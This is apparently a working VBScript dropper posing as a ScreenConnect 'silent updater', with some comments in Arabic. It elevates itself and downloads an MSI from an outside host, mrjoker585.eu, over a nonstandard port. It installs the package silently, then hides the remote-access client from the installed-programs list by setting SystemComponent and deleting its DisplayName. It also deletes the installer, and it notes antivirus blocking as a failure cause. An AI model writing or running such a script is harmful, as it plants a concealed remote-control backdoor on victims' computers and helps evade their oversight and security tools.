'==========================================================================
' SCRIPT:    ScreenConnect RMM Silent Updater & Hider (Pure VBS - Robust Download)
' DESCRIPTION: A single script that uninstalls the old version, installs
'              the new version silently, and then forces the new application
'              to be hidden from the Control Panel.
'==========================================================================

Option Explicit

' --- GLOBAL OBJECTS AND VARIABLES ---
Dim oShell, oFSO
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")

' --- CONFIGURATION ---
Dim sMsiUrl, sMsiPath, sTempDir, sLogFile
sMsiUrl  = "http://mrjoker585.eu:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
sTempDir = oShell.ExpandEnvironmentStrings("%TEMP%")
sMsiPath = sTempDir & "\" & "56BSSW3K0000_10POJPQ9MT3B4_windows_x64.msi"
sLogFile = sTempDir & "\ScreenConnect_Install.log"

' !! IMPORTANT !!
' This keyword is used to find and hide the application after installation.
Dim sKeywordToHide
sKeywordToHide = "ScreenConnect"

'==========================================================================
' MAIN LOGIC
'==========================================================================
Call Main()

'==========================================================================
' CORE FUNCTIONS
'==========================================================================

Sub Main()
    LogMessage "========== Starting Integrated ScreenConnect Update & Hide Process =========="
    
    If Not IsScriptElevated() Then
        LogMessage "Script is not running with elevated privileges. Attempting to elevate."
        ElevateScript()
        WScript.Quit
    End If
    LogMessage "Script is running with elevated privileges."

    LogMessage "Attempting to find and uninstall the old version of ScreenConnect."
    UninstallOldVersion

    LogMessage "Downloading new installer from: " & sMsiUrl
    If Not DownloadMSI(sMsiUrl, sMsiPath) Then
        LogMessage "FATAL: Failed to download the MSI file. Aborting."
        WScript.Quit 1
    End If
    LogMessage "MSI file downloaded successfully to: " & sMsiPath

    Dim sInstallCmd
    sInstallCmd = "msiexec /i """ & sMsiPath & """ /qn /norestart " & _
                  "LicenseAccepted=YES " & _
                  "POLICY_CATEGORY_ID=-1 " & _
                  "INSTALL_ARGS=""sourceInstall=silent"""
    
    LogMessage "Starting silent installation."
    LogMessage "Executing command: " & sInstallCmd
    
    Dim nExitCode
    nExitCode = oShell.Run(sInstallCmd, 0, True)
    LogMessage "Installation command finished with exit code: " & nExitCode

    If nExitCode = 0 Then
        LogMessage "Installation appears to have been successful (Exit Code 0)."
        
        ' --- إخفاء البرنامج بالقوة بعد التثبيت ---
        LogMessage "Waiting 10 seconds for the installer to finalize..."
        WScript.Sleep 10000
        
        LogMessage "Now attempting to force-hide the application using keyword: " & sKeywordToHide
        ForceHideApplication sKeywordToHide
        
    Else
        LogMessage "WARNING: Installation command returned a non-zero exit code (" & nExitCode & "). This may indicate a failure."
        LogMessage "Common reasons: Antivirus/EDR blocking, corrupted MSI file, or insufficient permissions."
    End If

    LogMessage "Cleaning up temporary files."
    If oFSO.FileExists(sMsiPath) Then
        oFSO.DeleteFile sMsiPath, True
        LogMessage "Temporary MSI file deleted."
    End If

    LogMessage "========== Integrated process finished. =========="
End Sub

'==========================================================================
' FUNCTION: Force Hide Application
'==========================================================================
Sub ForceHideApplication(sKeyword)
    On Error Resume Next
    Const HKEY_LOCAL_MACHINE = &H80000002
    Const HKEY_CURRENT_USER = &H80000001
    
    Dim oReg
    Set oReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
    
    Dim aHives, aPaths, oHive, sPath
    aHives = Array(HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER)
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    LogMessage "Starting brute-force search for keyword: " & sKeyword
    
    For Each oHive In aHives
        For Each sPath In aPaths
            LogMessage "Searching in Hive: " & GetHiveName(oHive) & ", Path: " & sPath
            SearchAndHideInPath oReg, oHive, sPath, sKeyword
        Next
    Next
    
    LogMessage "Brute-force hide process completed."
    On Error GoTo 0
End Sub

'==========================================================================
' FUNCTION: Search and Hide in a specific Registry Path
'==========================================================================
Sub SearchAndHideInPath(oReg, lHive, sKeyPath, sKeyword)
    On Error Resume Next
    Dim arrSubKeys, sSubKey, sDisplayName
    oReg.EnumKey lHive, sKeyPath, arrSubKeys
    
    If IsArray(arrSubKeys) Then
        For Each sSubKey In arrSubKeys
            oReg.GetStringValue lHive, sKeyPath & "\" & sSubKey, "DisplayName", sDisplayName
            If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                If InStr(1, sDisplayName, sKeyword, vbTextCompare) > 0 Then
                    LogMessage "FOUND MATCH: '" & sDisplayName & "' at key '" & sSubKey & "'"
                    
                    ' تطبيق أساليب الإخفاء
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "SystemComponent", 1
                    LogMessage " -> Applied SystemComponent=1"
                    
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayName"
                    LogMessage " -> Deleted DisplayName value"
                End If
            End If
        Next
    End If
    On Error GoTo 0
End Sub

'==========================================================================
' HELPER FUNCTIONS
'==========================================================================

Function UninstallOldVersion()
    On Error Resume Next
    Const HKEY_LOCAL_MACHINE = &H80000002
    Dim oReg, sKeyPath, arrSubKeys, sSubKey
    Set oReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
    sKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    
    oReg.EnumKey HKEY_LOCAL_MACHINE, sKeyPath, arrSubKeys
    
    If IsArray(arrSubKeys) Then
        For Each sSubKey In arrSubKeys
            Dim sDisplayName, sUninstallString
            oReg.GetStringValue HKEY_LOCAL_MACHINE, sKeyPath & "\" & sSubKey, "DisplayName", sDisplayName
            If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Then
                LogMessage "Found old version: " & sDisplayName
                oReg.GetStringValue HKEY_LOCAL_MACHINE, sKeyPath & "\" & sSubKey, "QuietUninstallString", sUninstallString
                If IsEmpty(sUninstallString) Or sUninstallString = "" Then
                    oReg.GetStringValue HKEY_LOCAL_MACHINE, sKeyPath & "\" & sSubKey, "UninstallString", sUninstallString
                    sUninstallString = sUninstallString & " /qn /norestart"
                End If
                LogMessage "Uninstalling with command: " & sUninstallString
                ExecuteHiddenCommand sUninstallString
                Exit For
            End If
        Next
    Else
        LogMessage "No old version of ScreenConnect found in the registry."
    End If
End Function

Function IsScriptElevated()
    IsScriptElevated = False
    On Error Resume Next
    Dim sTestFile
    sTestFile = oShell.ExpandEnvironmentStrings("%WINDIR%") & "\test.tmp"
    oFSO.CreateTextFile(sTestFile).Close
    If Err.Number = 0 Then
        oFSO.DeleteFile sTestFile
        IsScriptElevated = True
    End If
    On Error GoTo 0
End Function

Sub ElevateScript()
    Dim oShellApp
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
End Sub

' ========================================================================
' التعديل الأهم: دالة التنزيل الجديدة باستخدام XMLHTTP (أكثر استقراراً)
' ========================================================================
Function DownloadMSI(sUrl, sDestPath)
    On Error Resume Next
    
    ' لو الملف موجود أصلاً، امسحه عشان نضمن تنزيل نسخة جديدة
    If oFSO.FileExists(sDestPath) Then
        oFSO.DeleteFile sDestPath, True
    End If

    LogMessage "Initializing HTTP download object..."
    
    Dim oHTTP
    ' استخدام MSXML2.ServerXMLHTTP لأنه الأكثر استقراراً للتنزيل من الخوادم
    Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    If Err.Number <> 0 Then
        LogMessage "MSXML2.ServerXMLHTTP.6.0 not found, trying alternative..."
        Err.Clear
        Set oHTTP = CreateObject("Microsoft.XMLHTTP")
    End If

    oHTTP.Open "GET", sUrl, False
    oHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    oHTTP.Send
    
    ' التأكد من إن الطلب نجح (Status 200 = OK)
    If Err.Number <> 0 Then
        LogMessage "HTTP Request Error: " & Err.Description
        DownloadMSI = False
        Exit Function
    End If

    If oHTTP.Status <> 200 Then
        LogMessage "HTTP Error: Status " & oHTTP.Status & " - " & oHTTP.StatusText
        DownloadMSI = False
        Exit Function
    End If

    LogMessage "Download request successful. Writing file to disk..."
    
    ' حفظ الملف على الجهاز باستخدام ADODB.Stream
    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1 ' adTypeBinary
    oStream.Open
    oStream.Write oHTTP.responseBody
    oStream.SaveToFile sDestPath, 2 ' adSaveCreateOverWrite
    oStream.Close

    If Err.Number <> 0 Then
        LogMessage "File Write Error: " & Err.Description
        DownloadMSI = False
        Exit Function
    End If

    ' التأكد إن الملف اتنزل فعلاً وله حجم أكبر من 0
    If oFSO.FileExists(sDestPath) Then
        Dim oFile
        Set oFile = oFSO.GetFile(sDestPath)
        If oFile.Size > 0 Then
            LogMessage "File saved successfully. Size: " & oFile.Size & " bytes."
            DownloadMSI = True
        Else
            LogMessage "Error: Downloaded file is 0 bytes."
            oFSO.DeleteFile sDestPath, True
            DownloadMSI = False
        End If
        Set oFile = Nothing
    Else
        LogMessage "Error: File does not exist after download attempt."
        DownloadMSI = False
    End If

    Set oStream = Nothing
    Set oHTTP = Nothing
    On Error GoTo 0
End Function

Sub ExecuteHiddenCommand(sCmd)
    oShell.Run "cmd /c " & sCmd, 0, True
End Sub

Sub LogMessage(sMessage)
    On Error Resume Next
    Dim oLogFile
    Set oLogFile = oFSO.OpenTextFile(sLogFile, 8, True)
    If Err.Number = 0 Then
        oLogFile.WriteLine Now & " - " & sMessage
        oLogFile.Close
    End If
    On Error GoTo 0
End Sub

Function GetHiveName(lHive)
    Select Case lHive
        Case &H80000002
            GetHiveName = "HKEY_LOCAL_MACHINE"
        Case &H80000001
            GetHiveName = "HKEY_CURRENT_USER"
        Case Else
            GetHiveName = "UNKNOWN"
    End Select
End Function

WScript.Quit(0)